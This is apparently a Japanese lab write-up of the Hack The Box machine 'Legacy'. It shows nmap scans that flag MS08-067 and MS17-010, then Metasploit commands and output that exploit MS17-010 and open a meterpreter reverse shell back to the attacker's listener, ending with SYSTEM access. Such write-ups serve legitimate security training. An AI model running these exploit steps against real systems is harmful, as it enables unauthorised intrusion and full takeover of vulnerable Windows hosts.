---
layout:        post
title:         "HTB easy (Win): nmap vuln > msf"
date:          2021-05-27
category:      Security
cover:         /assets/cover14.jpg
redirect_from: /pentest/htb-easy-legacy
comments:      true
published:     true
latex:         false
photoswipe:    false
# sitemap: false
# feed:    false
---

nmapのvulnで脆弱性を見つけて、Metasploitでルート権限を奪取する。

- マシン名 : Legacy (Windows)
- タグ : Windows, Injection
- 使用ツール : nmap, msfconsole

### Enumeration

nmap

```console
sudo nmap -A -oN nmaptcp 10.129.137.196
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-27 10:10 UTC
Nmap scan report for 10.129.137.196
Host is up (0.24s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Device type: general purpose|specialized
Running (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (94%), General Dynamics embedded (89%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2
Aggressive OS guesses: Microsoft Windows XP SP3 (94%), Microsoft Windows XP (92%), Microsoft Windows Server 2003 SP1 or SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows 2000 SP4 (91%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows XP SP2 or SP3 (91%), Microsoft Windows Server 2003 (90%), Microsoft Windows XP SP2 or Windows Server 2003 (90%), Microsoft Windows XP Professional SP3 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

...省略...
```

脆弱性のあるバージョンか調べる

```console
$sudo nmap --script vuln -p139,445 10.129.137.196
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-27 10:18 UTC
Nmap scan report for 10.129.137.196
Host is up (0.24s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 27.71 seconds
```


### Foothold

nmap vulnで検出された脆弱性の一つである MS17-010 を使って攻撃する

```console
$ msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_psexec
set lhost 10.10.14.56
set rhosts 10.129.137.196
options
run
```

msfconsole

```console

$ msfconsole
msf6 > search ms17-010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   3  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   4  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

msf6 > use 2

[*] Using configured payload windows/meterpreter/reverse_tcp

...省略...

msf6 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 10.10.14.56:4444
[*] 10.129.137.196:445 - Target OS: Windows 5.1
[*] 10.129.137.196:445 - Filling barrel with fish... done
[*] 10.129.137.196:445 - <---------------- | Entering Danger Zone | ---------------->
[*] 10.129.137.196:445 -        [*] Preparing dynamite...
[*] 10.129.137.196:445 -                [*] Trying stick 1 (x86)...Boom!
[*] 10.129.137.196:445 -        [+] Successfully Leaked Transaction!
[*] 10.129.137.196:445 -        [+] Successfully caught Fish-in-a-barrel
[*] 10.129.137.196:445 - <---------------- | Leaving Danger Zone | ---------------->
[*] 10.129.137.196:445 - Reading from CONNECTION struct at: 0x81946c90
[*] 10.129.137.196:445 - Built a write-what-where primitive...
[+] 10.129.137.196:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.137.196:445 - Selecting native target
[*] 10.129.137.196:445 - Uploading payload... WnWusjzr.exe
[*] 10.129.137.196:445 - Created \WnWusjzr.exe...
[+] 10.129.137.196:445 - Service started successfully...
[*] Sending stage (175174 bytes) to 10.129.137.196
[*] 10.129.137.196:445 - Deleting \WnWusjzr.exe...
[*] Meterpreter session 1 opened (10.10.14.56:4444 -> 10.129.137.196:1052) at 2021-05-27 10:31:12 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > search -f root.txt
Found 1 result...
    c:\Documents and Settings\Administrator\Desktop\root.txt (32 bytes)

meterpreter > cat 'c:\Documents and Settings\Administrator\Desktop\root.txt'

993...713
```

ルート権限を奪取できたので終了
